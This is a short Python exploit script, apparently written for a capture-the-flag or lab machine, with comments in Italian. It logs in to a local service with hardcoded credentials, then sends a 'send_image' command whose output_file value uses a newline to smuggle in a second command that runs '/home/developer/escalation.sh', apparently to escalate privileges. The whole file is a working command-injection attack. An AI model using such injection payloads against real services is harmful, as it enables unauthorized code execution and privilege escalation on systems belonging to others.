import requests
import json
import os

# URL della richiesta
url = "http://localhost:9090"

session = requests.Session()
r = session.post(url+"/login", json={'username':'developer','password':'bigbang'}, headers = {"Content-Type": "application/json"})

# Token di autorizzazione (sostituiscilo con il tuo)
auth_token = r.json()['access_token']

# Nome del file di output
output_file = "something\n /home/developer/escalation.sh"

# Dati JSON della richiesta
payload = {
    "command": "send_image",
    "output_file": output_file
}

# Intestazioni della richiesta
headers = {
    "Content-Type": "application/json",
    "Authorization": f"Bearer {auth_token}"
}
   
response = requests.post(url+'/command', headers=headers, json=payload)

print(response.text)
